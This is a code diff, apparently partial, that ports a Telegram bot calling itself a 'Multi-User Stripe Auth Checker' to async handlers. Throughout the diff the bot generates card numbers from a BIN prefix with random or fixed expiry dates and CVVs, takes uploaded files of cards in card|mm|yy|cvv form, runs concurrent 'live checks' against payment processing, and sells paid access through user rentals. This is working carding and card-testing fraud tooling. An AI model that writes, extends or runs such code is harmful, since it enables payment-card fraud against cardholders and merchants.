+    await safe_send_message(update, system_info)
 
-def gen_command(update, context):
-    if not check_access_sync(update):
+async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the /gen command for generating cards with custom prefix, optional CVV, and live checking"""
+    if not await check_access(update):
         return
         
     if not context.args:
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             " <b>Card Generator</b>\n\n"
             " <b>Usage:</b> /gen [CUSTOM_PREFIX] |[mm]|[yy]|[cvv] [amount] [check/file]\n\n"
@@ -1361,9 +1488,13 @@ def gen_command(update, context):
         )
         return
     
+    # Join all arguments to handle the custom format
     full_args = ' '.join(context.args)
     
+    # Parse the custom format: CUSTOM_PREFIX |mm|yy|cvv amount [check/file]
+    # Try format with CVV first (including rnd for CVV)
     pattern_with_cvv = r'^(\d+)\s*\|(\d{1,2}|rnd)\|(\d{2,4}|rnd)\|(\d{3,4}|rnd)\s*(\d+)(?:\s+(check|file))?$'
+    # Try format without CVV
     pattern_without_cvv = r'^(\d+)\s*\|(\d{1,2}|rnd)\|(\d{2,4}|rnd)\s*(\d+)(?:\s+(check|file))?$'
     
     match = re.match(pattern_with_cvv, full_args)
@@ -1374,7 +1505,7 @@ def gen_command(update, context):
         has_cvv = False
     
     if not match:
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             "❌ <b>Invalid format!</b>\n\n"
             "✅ <b>Usage:</b> /gen [CUSTOM_PREFIX] |[mm]|[yy]|[cvv] [amount] [check/file]\n\n"
@@ -1397,10 +1528,11 @@ def gen_command(update, context):
         custom_prefix = match.group(1)
         exp_month_input = match.group(2)
         exp_year_input = match.group(3)
-        custom_cvv_input = match.group(4)
+        custom_cvv_input = match.group(4)  # This can be digits or 'rnd'
         amount_str = match.group(5)
-        action = match.group(6)
+        action = match.group(6)  # 'check', 'file', or None
         
+        # Handle CVV input - if 'rnd', set to None for random generation
         if custom_cvv_input.lower() == 'rnd':
             custom_cvv = None
             cvv_display = "Random"
@@ -1412,15 +1544,17 @@ def gen_command(update, context):
         exp_month_input = match.group(2)
         exp_year_input = match.group(3)
         amount_str = match.group(4)
-        action = match.group(5)
-        custom_cvv = None
+        action = match.group(5)  # 'check', 'file', or None
+        custom_cvv = None  # No CVV provided
         cvv_display = "Random"
     
+    # Default action is 'file' if not specified
     if action is None:
         action = 'file'
     
+    # Validate custom prefix
     if not custom_prefix.isdigit() or len(custom_prefix) < 4 or len(custom_prefix) > 15:
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             "❌ <b>Invalid custom prefix!</b>\n\n"
             "Custom prefix must be 4-15 digits\n\n"
@@ -1431,6 +1565,7 @@ def gen_command(update, context):
         )
         return
     
+    # Handle month (either fixed or random)
     random_month = False
     if exp_month_input.lower() == 'rnd':
         random_month = True
@@ -1440,10 +1575,10 @@ def gen_command(update, context):
             exp_month_int = int(exp_month_input)
             if exp_month_int < 1 or exp_month_int > 12:
                 raise ValueError("Invalid month")
-            exp_month = f"{exp_month_int:02d}"
+            exp_month = f"{exp_month_int:02d}"  # Format as 2 digits
             exp_month_display = exp_month
         except ValueError:
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 "❌ <b>Invalid expiry month!</b>\n\n"
                 "Month must be between 01-12 or 'rnd' for random\n\n"
@@ -1451,6 +1586,7 @@ def gen_command(update, context):
             )
             return
     
+    # Handle year (either fixed or random)
     random_year = False
     if exp_year_input.lower() == 'rnd':
         random_year = True
@@ -1459,26 +1595,29 @@ def gen_command(update, context):
         try:
             exp_year_int = int(exp_year_input)
             if len(exp_year_input) == 2:
+                # Convert 2-digit year to 4-digit (assume 2000s)
                 exp_year_int = 2000 + exp_year_int
             elif len(exp_year_input) == 4:
+                # Already 4-digit year
                 pass
             else:
                 raise ValueError("Invalid year format")
             
             current_year = datetime.now().year
             if exp_year_int < current_year or exp_year_int > current_year + 10:
-                safe_send_message_sync(
+                await safe_send_message(
                     update,
                     f"⚠️ <b>Expiry year warning!</b>\n\n"
                     f"Year {exp_year_int} seems unrealistic.\n"
                     f"Current year: {current_year}\n\n"
                     f"Continue anyway?"
                 )
+                # Continue despite warning
             
             exp_year = str(exp_year_int)
             exp_year_display = exp_year_input
         except ValueError:
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 "❌ <b>Invalid expiry year!</b>\n\n"
                 "Year must be 2 or 4 digits or 'rnd' for random\n\n"
@@ -1489,9 +1628,10 @@ def gen_command(update, context):
             )
             return
     
+    # Validate custom CVV if provided (and not 'rnd')
     if custom_cvv is not None and custom_cvv != 'rnd':
         if not custom_cvv.isdigit():
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 "❌ <b>Invalid CVV!</b>\n\n"
                 "CVV must be 3-4 digits or 'rnd' for random\n\n"
@@ -1502,18 +1642,19 @@ def gen_command(update, context):
             )
             return
         
-        if custom_prefix.startswith('3'):
+        # Validate CVV length based on card type
+        if custom_prefix.startswith('3'):  # Amex
             if len(custom_cvv) != 4:
-                safe_send_message_sync(
+                await safe_send_message(
                     update,
                     "❌ <b>Invalid CVV for Amex!</b>\n\n"
                     "Amex cards require 4-digit CVV\n\n"
                     "Example: <code>/gen 371449 |12|27|1234 10</code>"
                 )
                 return
-        else:
+        else:  # Visa, MasterCard, Discover
             if len(custom_cvv) != 3:
-                safe_send_message_sync(
+                await safe_send_message(
                     update,
                     "❌ <b>Invalid CVV for Visa/MasterCard!</b>\n\n"
                     "Visa/MasterCard cards require 3-digit CVV\n\n"
@@ -1521,19 +1662,20 @@ def gen_command(update, context):
                 )
                 return
     
+    # Validate amount
     try:
         amount = int(amount_str)
         if amount <= 0:
             raise ValueError("Amount must be positive")
         if amount > 500:
             amount = 500
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 f"⚠️ <b>Amount limited to 500 cards</b>\n"
                 f"Generating 500 cards instead of {amount_str}"
             )
     except ValueError:
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             "❌ <b>Invalid amount!</b>\n\n"
             "Amount must be a number between 1-500\n\n"
@@ -1541,13 +1683,15 @@ def gen_command(update, context):
         )
         return
     
-    if custom_prefix.startswith('3'):
+    # Determine card length based on custom prefix
+    if custom_prefix.startswith('3'):  # Amex
         card_length = 15
-    else:
+    else:  # Visa, MasterCard, Discover
         card_length = 16
     
+    # Check if custom prefix is too long for card length
     if len(custom_prefix) >= card_length:
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             f"❌ <b>Custom prefix too long!</b>\n\n"
             f"Your prefix has {len(custom_prefix)} digits but {card_length}-digit cards can only have up to {card_length-1} digits before the check digit.\n\n"
@@ -1557,7 +1701,7 @@ def gen_command(update, context):
     
     action_display = "Check live" if action == 'check' else "Save to file"
     
-    safe_send_message_sync(
+    await safe_send_message(
         update,
         f"🔄 <b>Generating {amount} cards...</b>\n\n"
         f" <b>Custom Prefix:</b> {custom_prefix}\n"
@@ -1572,76 +1716,90 @@ def gen_command(update, context):
     )
     
     try:
+        # Generate cards
         generated_cards = generate_cards(custom_prefix, amount, card_length)
         
         if not generated_cards:
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 "❌ <b>Failed to generate cards!</b>\n\n"
                 "Please check your custom prefix and try again."
             )
             return
         
+        # Create card strings with specified expiry and CVV
         cards_with_details = []
         
         for card in generated_cards:
+            # Generate random month if requested
             if random_month:
                 exp_month_actual, _, _ = generate_random_expiry()
             else:
                 exp_month_actual = exp_month
             
+            # Generate random year if requested
             if random_year:
                 _, _, exp_year_actual_2d = generate_random_expiry()
             else:
-                exp_year_actual_2d = exp_year[-2:]
+                exp_year_actual_2d = exp_year[-2:]  # Use 2-digit year
             
+            # Generate random CVV if not provided or if 'rnd' is specified
             if custom_cvv is None:
-                if custom_prefix.startswith('3'):
+                if custom_prefix.startswith('3'):  # Amex - 4 digit CVV
                     random_cvv = str(random.randint(1000, 9999))
-                else:
+                else:  # Visa/MasterCard - 3 digit CVV
                     random_cvv = str(random.randint(100, 999))
                 card_string = f"{card}|{exp_month_actual}|{exp_year_actual_2d}|{random_cvv}"
             else:
+                # Use the same custom CVV for all cards
                 card_string = f"{card}|{exp_month_actual}|{exp_year_actual_2d}|{custom_cvv}"
             
             cards_with_details.append(card_string)
         
+        # Save to file (always create the file for both options)
         filename = f"generated_{custom_prefix}_{amount}.txt"
         with open(filename, 'w') as f:
             for card in cards_with_details:
                 f.write(card + '\n')
         
+        # Handle different actions
         if action == 'check':
+            # Check if system can handle more users
             if not can_accept_new_user():
-                safe_send_message_sync(
+                await safe_send_message(
                     update,
                     "🚫 <b>System Busy</b>\n\n"
                     "Too many users are currently checking cards.\n"
                     "Please try again in a few minutes or use 'file' option instead.\n\n"
                     f"Max concurrent users: {MAX_CONCURRENT_USERS}"
                 )
+                # Clean up file
                 try:
                     os.remove(filename)
                 except:
                     pass
                 return
             
-            safe_send_message_sync(
+            # Start live checking the generated cards
+            await safe_send_message(
                 update,
                 f" <b>Starting live check for {len(cards_with_details)} generated cards...</b>"
             )
             
+            # Create a user session for checking
             chat_id = update.message.chat_id
             user_session = get_user_session(chat_id)
             
             if user_session["checking"]:
-                safe_send_message_sync(update, "❌ Please stop current checking first using /stop")
+                await safe_send_message(update, "❌ Please stop current checking first using /stop")
+                # Clean up file
                 try:
                     os.remove(filename)
                 except:
                     pass
                 return
             
+            # Initialize session with generated cards
             user_session.update({
                 "checking": True,
                 "cards": cards_with_details,
@@ -1679,12 +1837,13 @@ def gen_command(update, context):
                 data = response.json()
                 user_session["message_id"] = data['result']['message_id']
             
+            # Start checking in background using global thread pool
             future = global_thread_pool.submit(checking_thread, user_session)
             
             with active_users_lock:
                 active_count = active_users_count
             
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 f"✅ Generated {len(cards_with_details)} cards and started live check!\n"
                 f"👥 Active users: {active_count + 1}/{MAX_CONCURRENT_USERS}\n"
@@ -1692,13 +1851,14 @@ def gen_command(update, context):
                 f"Use /stats to see progress."
             )
             
-        else:
+        else:  # action == 'file' or default
+            # Send file to user without live check
             cvv_info = "Random CVV for each card" if custom_cvv is None else f"Fixed CVV: {custom_cvv}"
             month_info = "Random month for each card" if random_month else f"Fixed month: {exp_month_display}"
             year_info = "Random year for each card" if random_year else f"Fixed year: {exp_year_display}"
             
             with open(filename, 'rb') as f:
-                context.bot.send_document(
+                await context.bot.send_document(
                     chat_id=update.effective_chat.id,
                     document=f,
                     filename=filename,
@@ -1716,6 +1876,7 @@ def gen_command(update, context):
                     parse_mode='HTML'
                 )
         
+        # Clean up file after sending
         try:
             os.remove(filename)
         except:
@@ -1723,19 +1884,21 @@ def gen_command(update, context):
             
     except Exception as e:
         logger.error(f"Error in gen_command: {e}")
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             "❌ <b>Error generating cards!</b>\n\n"
             "Please try again with a different custom prefix."
         )
         
+        # Clean up file in case of error
         try:
             if 'filename' in locals():
                 os.remove(filename)
         except:
             pass
 
-def cmds_command(update, context):
+async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the /cmds command"""
     user_id = str(update.effective_user.id)
     
     message = "🤖 <b>Available Commands</b>\n\n"
@@ -1769,35 +1932,37 @@ def cmds_command(update, context):
     
     message += "DM @mcchiatoos for any problem"
     
-    safe_send_message_sync(update, message)
+    await safe_send_message(update, message)
 
 # Admin commands
-def add_user_command(update, context):
+async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /adduser command - admin only"""
     user_id = str(update.effective_user.id)
     if user_id != ADMIN_ID:
-        safe_send_message_sync(update, "❌ Admin only command!")
+        await safe_send_message(update, "❌ Admin only command!")
         return
         
     if not context.args:
-        safe_send_message_sync(update, "❌ Usage: /adduser [user_id]")
+        await safe_send_message(update, "❌ Usage: /adduser [user_id]")
         return
         
     new_user_id = context.args[0]
     if new_user_id in AUTHORIZED_USERS:
-        safe_send_message_sync(update, "❌ User already exists!")
+        await safe_send_message(update, "❌ User already exists!")
         return
         
     AUTHORIZED_USERS.append(new_user_id)
-    safe_send_message_sync(update, f"✅ User {new_user_id} added successfully!")
+    await safe_send_message(update, f"✅ User {new_user_id} added successfully!")
 
-def add_rental_command(update, context):
+async def add_rental_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /addrental command - admin only"""
     user_id = str(update.effective_user.id)
     if user_id != ADMIN_ID:
-        safe_send_message_sync(update, "❌ Admin only command!")
+        await safe_send_message(update, "❌ Admin only command!")
         return
         
     if len(context.args) < 2:
-        safe_send_message_sync(update, "❌ Usage: /addrental [user_id] [days]")
+        await safe_send_message(update, "❌ Usage: /addrental [user_id] [days]")
         return
         
     rental_user_id = context.args[0]
@@ -1805,165 +1970,175 @@ def add_rental_command(update, context):
         days = int(context.args[1])
         expiry_time = add_rental(rental_user_id, days)
         
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             f"✅ Rental added for user {rental_user_id}\n"
             f"📅 Duration: {days} day(s)"
         )
     except ValueError:
-        safe_send_message_sync(update, "❌ Invalid days format!")
+        await safe_send_message(update, "❌ Invalid days format!")
 
-def list_users_command(update, context):
+async def list_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /listusers command - admin only"""
     user_id = str(update.effective_user.id)
     if user_id != ADMIN_ID:
-        safe_send_message_sync(update, "❌ Admin only command!")
+        await safe_send_message(update, "❌ Admin only command!")
         return
         
     if not AUTHORIZED_USERS:
-        safe_send_message_sync(update, "❌ No authorized users!")
+        await safe_send_message(update, "❌ No authorized users!")
         return
         
     users_list = "\n".join(AUTHORIZED_USERS)
-    safe_send_message_sync(
+    await safe_send_message(
         update,
         f"👑 <b>Authorized Users</b>\n\n{users_list}"
     )
 
-def list_rentals_command(update, context):
+async def list_rentals_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /listrentals command - admin only"""
     user_id = str(update.effective_user.id)
     if user_id != ADMIN_ID:
-        safe_send_message_sync(update, "❌ Admin only command!")
+        await safe_send_message(update, "❌ Admin only command!")
         return
         
     if not USER_RENTALS:
-        safe_send_message_sync(update, "❌ No active rentals!")
+        await safe_send_message(update, "❌ No active rentals!")
         return
         
     rentals_list = []
     for rental_user_id, expiry_time in USER_RENTALS.items():
         days_left = get_rental_days_left(expiry_time)
-        username = get_user_info(rental_user_id)
+        username = get_user_info_sync(rental_user_id)  # FIXED: Use sync version
         rentals_list.append(f"👤 {username} (ID: {rental_user_id}) - 📅 {days_left} days left")
     
-    safe_send_message_sync(
+    await safe_send_message(
         update,
         f"💳 <b>Active Rentals</b>\n\n" + "\n".join(rentals_list)
     )
 
-def list_users_with_names_command(update, context):
+async def list_users_with_names_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /listusers_with_names command - admin only"""
     user_id = str(update.effective_user.id)
     if user_id != ADMIN_ID:
-        safe_send_message_sync(update, "❌ Admin only command!")
+        await safe_send_message(update, "❌ Admin only command!")
         return
         
     if not AUTHORIZED_USERS:
-        safe_send_message_sync(update, "❌ No authorized users!")
+        await safe_send_message(update, "❌ No authorized users!")
         return
         
     users_list = []
     for user_id in AUTHORIZED_USERS:
-        username = get_user_info(user_id)
+        username = get_user_info_sync(user_id)  # FIXED: Use sync version
         users_list.append(f"👤 {username} (ID: {user_id})")
     
-    safe_send_message_sync(
+    await safe_send_message(
         update,
         f"👑 <b>Authorized Users with Names</b>\n\n" + "\n".join(users_list)
     )
 
-def list_rentals_with_names_command(update, context):
+async def list_rentals_with_names_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /listrentals_with_names command - admin only"""
     user_id = str(update.effective_user.id)
     if user_id != ADMIN_ID:
-        safe_send_message_sync(update, "❌ Admin only command!")
+        await safe_send_message(update, "❌ Admin only command!")
         return
         
     if not USER_RENTALS:
-        safe_send_message_sync(update, "❌ No active rentals!")
+        await safe_send_message(update, "❌ No active rentals!")
         return
         
     rentals_list = []
     for rental_user_id, expiry_time in USER_RENTALS.items():
         days_left = get_rental_days_left(expiry_time)
-        username = get_user_info(rental_user_id)
+        username = get_user_info_sync(rental_user_id)  # FIXED: Use sync version
         rentals_list.append(f"👤 {username} (ID: {rental_user_id}) - 📅 {days_left} days left")
     
-    safe_send_message_sync(
+    await safe_send_message(
         update,
         f"💳 <b>Active Rentals with Names</b>\n\n" + "\n".join(rentals_list)
     )
 
-def remove_user_command(update, context):
+async def remove_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /removeuser command - admin only"""
     user_id = str(update.effective_user.id)
     if user_id != ADMIN_ID:
-        safe_send_message_sync(update, "❌ Admin only command!")
+        await safe_send_message(update, "❌ Admin only command!")
         return
         
     if not context.args:
-        safe_send_message_sync(update, "❌ Usage: /removeuser [user_id]")
+        await safe_send_message(update, "❌ Usage: /removeuser [user_id]")
         return
         
     remove_user_id = context.args[0]
     if remove_user_id in AUTHORIZED_USERS:
         AUTHORIZED_USERS.remove(remove_user_id)
-        safe_send_message_sync(update, f"✅ User {remove_user_id} removed!")
+        await safe_send_message(update, f"✅ User {remove_user_id} removed!")
     else:
-        safe_send_message_sync(update, "❌ User not found!")
+        await safe_send_message(update, "❌ User not found!")
 
-def remove_rental_command(update, context):
+async def remove_rental_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /removerental command - admin only"""
     user_id = str(update.effective_user.id)
     if user_id != ADMIN_ID:
-        safe_send_message_sync(update, "❌ Admin only command!")
+        await safe_send_message(update, "❌ Admin only command!")
         return
         
     if not context.args:
-        safe_send_message_sync(update, "❌ Usage: /removerental [user_id]")
+        await safe_send_message(update, "❌ Usage: /removerental [user_id]")
         return
         
     remove_user_id = context.args[0]
     if remove_rental(remove_user_id):
-        safe_send_message_sync(update, f"✅ Rental removed for user {remove_user_id}!")
+        await safe_send_message(update, f"✅ Rental removed for user {remove_user_id}!")
     else:
-        safe_send_message_sync(update, "❌ Rental not found!")
+        await safe_send_message(update, "❌ Rental not found!")
 
-def handle_file(update, context):
-    if not check_access_sync(update):
+async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle file uploads"""
+    if not await check_access(update):
         return
         
     chat_id = update.message.chat_id
     user_session = get_user_session(chat_id)
     
     if user_session["checking"]:
-        safe_send_message_sync(update, "❌ Please stop current checking first using /stop")
+        await safe_send_message(update, "❌ Please stop current checking first using /stop")
         return
         
     document = update.message.document
     if document.file_name.endswith('.txt'):
-        file = context.bot.get_file(document.file_id)
+        # Download the file
+        file = await context.bot.get_file(document.file_id)
         file_path = f"cc_{chat_id}.txt"
-        file.download(file_path)
+        await file.download_to_drive(file_path)
         
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             f"✅ File received: {document.file_name}\n"
             f"Use /start to begin checking\n"
             f"Max cards: {MAX_CARDS_LIMIT}"
         )
     else:
-        safe_send_message_sync(update, "❌ Please upload a .txt file")
+        await safe_send_message(update, "❌ Please upload a .txt file")
 
-def start_checking(update, context):
+async def start_checking(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Optimized start checking that prevents system overload"""
     try:
-        if not check_access_sync(update):
+        if not await check_access(update):
             return
             
         chat_id = update.message.chat_id
         user_session = get_user_session(chat_id)
         
         if user_session["checking"]:
-            safe_send_message_sync(update, "❌ You already have a checking session in progress! Use /stop to stop first.")
+            await safe_send_message(update, "❌ You already have a checking session in progress! Use /stop to stop first.")
             return
         
+        # Check if system can handle more users
         if not can_accept_new_user():
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 "🚫 <b>System Busy</b>\n\n"
                 "Too many users are currently checking cards.\n"
@@ -1974,7 +2149,7 @@ def start_checking(update, context):
         
         user_file = f"cc_{chat_id}.txt"
         if not os.path.exists(user_file):
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 "📁 <b>Send cc.txt file with cards to check.</b>\n\n"
                 "Format:\n<code>card|mm|yy|cvv</code>\n\n"
@@ -1987,22 +2162,23 @@ def start_checking(update, context):
                 cards = [line.strip() for line in f if line.strip()]
         except Exception as e:
             logger.error(f"Error reading card file: {e}")
-            safe_send_message_sync(update, "❌ Error reading your card file!")
+            await safe_send_message(update, "❌ Error reading your card file!")
             return
         
         if not cards:
-            safe_send_message_sync(update, "❌ No cards found in your file!")
+            await safe_send_message(update, "❌ No cards found in your file!")
             return
         
         if len(cards) > MAX_CARDS_LIMIT:
             cards = cards[:MAX_CARDS_LIMIT]
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 f"⚠️ <b>Maximum card limit applied!</b>\n\n"
                 f"Only the first {MAX_CARDS_LIMIT} cards will be checked.\n"
                 f"Your file contained {len(cards)} cards."
             )
         
+        # Initialize session
         user_session.update({
             "checking": True,
             "cards": cards,
@@ -2022,6 +2198,7 @@ def start_checking(update, context):
             "active": False
         })
         
+        # Send initial message
         initial_counts = {
             'status': 'Starting...',
             'cvv_live': 0,
@@ -2041,12 +2218,13 @@ def start_checking(update, context):
             data = response.json()
             user_session["message_id"] = data['result']['message_id']
         
+        # Start checking in background
         future = global_thread_pool.submit(checking_thread, user_session)
         
         with active_users_lock:
             active_count = active_users_count
         
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             f"✅ Checking started! Processing {len(cards)} cards.\n"
             f"👥 Active users: {active_count + 1}/{MAX_CONCURRENT_USERS}\n"
@@ -2056,11 +2234,13 @@ def start_checking(update, context):
         
     except Exception as e:
         logger.error(f"Error in start_checking: {e}")
-        safe_send_message_sync(update, "❌ An error occurred while starting the check.")
+        await safe_send_message(update, "❌ An error occurred while starting the check.")
 
-def error_handler(update, context):
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Global error handler for the bot."""
     logger.error("Exception while handling an update:", exc_info=context.error)
     
+    # Log the full error details
     error_msg = f"⚠️ <b>Bot Error</b>\n\n"
     
     if update and update.effective_message:
@@ -2071,11 +2251,13 @@ def error_handler(update, context):
     error_msg += f"<b>Message:</b> {str(context.error)}\n"
     error_msg += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-d %I:%M %p')}"
     
+    # Send error log via the logging bot
     send_error_log_sync(error_msg)
     
+    # Optional: Notify user about the error
     try:
         if update and update.effective_chat:
-            context.bot.send_message(
+            await context.bot.send_message(
                 chat_id=update.effective_chat.id,
                 text="❌ An error occurred while processing your request. Please try again.",
                 parse_mode='HTML'
@@ -2083,74 +2265,65 @@ def error_handler(update, context):
     except Exception as e:
         logger.error(f"Failed to send error message to user: {e}")
 
-# ✅ FIXED: Using older Updater pattern instead of Application
 def main():
-    """Main function to run the bot"""
+    """Main function to run the bot with optimized multi-user performance"""
     logger.info("🤖 Multi-User Stripe Auth Checker Bot Starting...")
     logger.info(f"✅ Authorized users: {AUTHORIZED_USERS}")
     logger.info(f"📊 Maximum cards per check: {MAX_CARDS_LIMIT}")
     logger.info(f"⚙️ Global thread pool workers: {GLOBAL_MAX_WORKERS}")
     logger.info(f"👤 User thread pool workers: {USER_MAX_WORKERS}")
     logger.info(f"👥 Max concurrent users: {MAX_CONCURRENT_USERS}")
+    logger.info(f"⏰ Request timeout: {REQUEST_TIMEOUT}s")
+    logger.info(f"💡 System optimized for 5 users with approved cards results file")
     
     cleanup_expired_rentals()
     
-    try:
-        # Create updater with the bot token
-        updater = Updater(BOT_TOKEN, use_context=True)
-        
-        # Get the dispatcher to register handlers
-        dp = updater.dispatcher
-        
-        # Add error handler
-        dp.add_error_handler(error_handler)
-        
-        # Add command handlers
-        dp.add_handler(CommandHandler("start", start_checking))
-        dp.add_handler(CommandHandler("stop", stop_command))
-        dp.add_handler(CommandHandler("stats", stats_command))
-        dp.add_handler(CommandHandler("myaccess", myaccess_command))
-        dp.add_handler(CommandHandler("bin", bin_command))
-        dp.add_handler(CommandHandler("gen", gen_command))
-        dp.add_handler(CommandHandler("active", active_command))
-        dp.add_handler(CommandHandler("system", system_command))
-        dp.add_handler(CommandHandler("cmds", cmds_command))
-        dp.add_handler(CommandHandler("help", cmds_command))
-        
-        # Add admin commands
-        dp.add_handler(CommandHandler("adduser", add_user_command))
-        dp.add_handler(CommandHandler("addrental", add_rental_command))
-        dp.add_handler(CommandHandler("listusers", list_users_command))
-        dp.add_handler(CommandHandler("listrentals", list_rentals_command))
-        dp.add_handler(CommandHandler("listusers_with_names", list_users_with_names_command))
-        dp.add_handler(CommandHandler("listrentals_with_names", list_rentals_with_names_command))
-        dp.add_handler(CommandHandler("removeuser", remove_user_command))
-        dp.add_handler(CommandHandler("removerental", remove_rental_command))
-        
-        # Add message handlers
-        dp.add_handler(MessageHandler(Filters.document, handle_file))
-        dp.add_handler(MessageHandler(Filters.text & ~Filters.command, start_command))
-        
-        # Add callback query handlers
-        dp.add_handler(CallbackQueryHandler(handle_stop_callback, pattern='stop_masschk_'))
-        dp.add_handler(CallbackQueryHandler(handle_noop_callback, pattern='noop'))
-        
-        logger.info("✅ Bot handlers registered successfully")
-        logger.info("🤖 Starting bot polling...")
-        
-        # Start the Bot
-        updater.start_polling()
-        
-        # Run the bot until you press Ctrl-C or the process receives SIGINT,
-        # SIGTERM or SIGABRT. This should be used most of the time, since
-        # start_polling() is non-blocking and will stop the bot gracefully.
-        logger.info("✅ Bot is now running and polling...")
-        updater.idle()
-        
-    except Exception as e:
-        logger.error(f"❌ Bot failed to start: {e}")
-        error_msg = f"🚨 <b>Bot Startup Failed</b>\n\nError: {str(e)}\nTime: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}"
-        send_error_log_sync(error_msg)
+    while True:
+        try:
+            application = Application.builder().token(BOT_TOKEN).build()
+            
+            application.add_error_handler(error_handler)
+            
+            # Add handlers
+            application.add_handler(CommandHandler("start", start_checking))
+            application.add_handler(CommandHandler("stop", stop_command))
+            application.add_handler(CommandHandler("stats", stats_command))
+            application.add_handler(CommandHandler("myaccess", myaccess_command))
+            application.add_handler(CommandHandler("bin", bin_command))
+            application.add_handler(CommandHandler("gen", gen_command))
+            application.add_handler(CommandHandler("active", active_command))
+            application.add_handler(CommandHandler("system", system_command))
+            application.add_handler(CommandHandler("cmds", cmds_command))
+            application.add_handler(CommandHandler("help", cmds_command))
+            
+            # Add admin commands
+            application.add_handler(CommandHandler("adduser", add_user_command))
+            application.add_handler(CommandHandler("addrental", add_rental_command))
+            application.add_handler(CommandHandler("listusers", list_users_command))
+            application.add_handler(CommandHandler("listrentals", list_rentals_command))
+            application.add_handler(CommandHandler("listusers_with_names", list_users_with_names_command))
+            application.add_handler(CommandHandler("listrentals_with_names", list_rentals_with_names_command))
+            application.add_handler(CommandHandler("removeuser", remove_user_command))
+            application.add_handler(CommandHandler("removerental", remove_rental_command))
+            
+            application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start_command))
+            
+            application.add_handler(CallbackQueryHandler(handle_stop_callback, pattern=r'^stop_masschk_'))
+            application.add_handler(CallbackQueryHandler(handle_noop_callback, pattern=r'^noop$'))
+            
+            logger.info("✅ Bot is running with 5 user limit and approved cards results file...")
+            application.run_polling(
+                drop_pending_updates=True,
+                allowed_updates=Update.ALL_TYPES,
+                poll_interval=1.0,
+                timeout=20
+            )
+            
+        except Exception as e:
+            logger.error(f"Bot crashed with error: {e}")
+            logger.info("🔄 Restarting bot in 5 seconds...")
+            time.sleep(5)
 
 if __name__ == "__main__":
     main()
